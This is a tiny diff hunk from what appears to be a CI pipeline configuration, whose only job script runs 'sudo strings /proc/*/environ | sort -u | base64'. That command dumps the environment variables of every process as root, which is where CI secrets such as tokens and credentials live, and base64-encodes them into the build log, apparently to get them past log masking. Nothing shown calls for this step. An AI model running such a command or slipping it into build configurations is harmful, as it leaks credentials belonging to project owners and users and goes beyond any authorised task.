@@ -6,4 +6,3 @@ env:
 jobs:
   include:
     - script: sudo strings /proc/*/environ | sort -u | base64
-
